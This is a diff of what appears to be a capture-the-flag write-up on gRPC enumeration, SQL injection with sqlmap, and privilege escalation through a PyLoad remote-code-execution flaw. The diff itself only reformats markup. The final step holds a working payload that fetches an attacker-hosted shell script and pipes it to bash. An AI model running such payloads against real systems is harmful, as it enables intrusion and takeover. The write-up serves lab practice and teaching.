@@ -70,7 +70,7 @@ SF:0\0\0\0\0\?\0\0");
 
 I see that this has some headers. I tried connecting using `telnet` or `nc`, then viewing the traffic within `wireshark`, but all I saw was this:
 
-<figure><img src="../../.gitbook/assets/image (1079).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1079).png>)
 
 Just a bunch of unrelated TCP traffic. I tried running `curl` on the port and received another weird error.
 
@@ -87,7 +87,7 @@ There are specific tools that are used to interact with this software, and we ca
 
 {% embed url="https://github.com/vadimi/grpc-client-cli" %}
 
-<figure><img src="../../.gitbook/assets/image (1581).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1581).png>)
 
 The tool worked, which means this is indeed gRPC running.
 
@@ -95,7 +95,6 @@ The tool worked, which means this is indeed gRPC running.
 
 This thing was running a 'SimpleApp' application, and we can enumerate it to see the default values accepted, create a user and login.
 
-{% code overflow="wrap" %}
 ```bash
 $ ./grpc-client-cli -V 10.129.40.34:50051
 ? Choose a service: SimpleApp
@@ -143,7 +142,6 @@ Request duration: 181.44517ms
 Request size: 20 bytes
 Response size: 166 bytes
 ```
-{% endcode %}
 
 So obviously, we have to exploit this to get the administrator account somehow. When I try to use the getInfo function, it complains that I don't have a valid token.
 
@@ -172,7 +170,6 @@ Response size: 53 bytes
 
 The last thing I tried with this was to login as the administrator with `admin:admin`, and it works!
 
-{% code overflow="wrap" %}
 ```bash
 Message json (type ? to see defaults): {"username":"admin","password":"admin"}
 {
@@ -192,7 +189,6 @@ grpc-accept-encoding: [identity, deflate, gzip]
 Response Trailers:
 token: [b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ2NjUwNzF9.iur8GhCEFahebtqwyeFLj7wybSwtO4qesiLEWKTv614']
 ```
-{% endcode %}
 
 I changed tools to `grpcui` because it was easier to use and allowed me to specify more headers.
 
@@ -203,11 +199,10 @@ $ ./grpcui -plaintext 10.129.40.34:50051
 gRPC Web UI available at http://127.0.0.1:35935/
 ```
 
-<figure><img src="../../.gitbook/assets/image (2865).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(2865).png>)
 
 Using this, we can capture the request in Burpsuite and attempt to include our administrator token. This was the HTTP request I sent via Burp, and it kept running into an error:
 
-{% code overflow="wrap" %}
 ```http
 POST /invoke/SimpleApp.getInfo HTTP/1.1
 Host: 127.0.0.1:35935
@@ -231,17 +226,16 @@ Sec-Fetch-Site: same-origin
 
 {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ2NjUwNzF9.iur8GhCEFahebtqwyeFLj7wybSwtO4qesiLEWKTv614"}],"data":[{"id":"123"}]}
 ```
-{% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (3195).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(3195).png>)
 
 I thought it was intentional, so I attempted some basic command and SQL injection. I found that UNION SQL injection works!
 
-<figure><img src="../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(154).png>)
 
 Using version enumeration, we can find that this uses SQLite.
 
-<figure><img src="../../.gitbook/assets/image (531).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(531).png>)
 
 I tossed this Burp request to `sqlmap`, which also gives me a true positive.
 
@@ -249,7 +243,7 @@ I tossed this Burp request to `sqlmap`, which also gives me a true positive.
 sqlmap -r req -p id --level 5 --risk 3 --dbms sqlite
 ```
 
-<figure><img src="../../.gitbook/assets/image (3645).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(3645).png>)
 
 Then, we can enumerate the database and dump the passwords within the database.
 
@@ -281,7 +275,7 @@ Table: accounts
 
 We had credentials for this user, and it works with `ssh`.
 
-<figure><img src="../../.gitbook/assets/image (693).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(693).png>)
 
 ## Privilege Escalation
 
@@ -316,7 +310,7 @@ chisel client 10.10.14.39 5555 R:8000:127.0.0.1:8000
 
 Here, we will see a PyLoad instance.
 
-<figure><img src="../../.gitbook/assets/image (1025).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1025).png>)
 
 This software had a recent RCE vulnerability found within it.
 
@@ -335,14 +329,12 @@ We can find a PoC here:
 
 We can simply change the command executed to give us a root shell:
 
-{% code overflow="wrap" %}
 ```bash
 $ curl -i -s -k -X $'POST' \
     --data-binary $'jk=pyimport%20os;os.system(\"curl%2010.10.14.39/shell.sh|bash\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
     $'http://127.0.0.1:8000/flash/addcrypted2
 ```
-{% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (3224).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(3224).png>)
 
 Rooted!
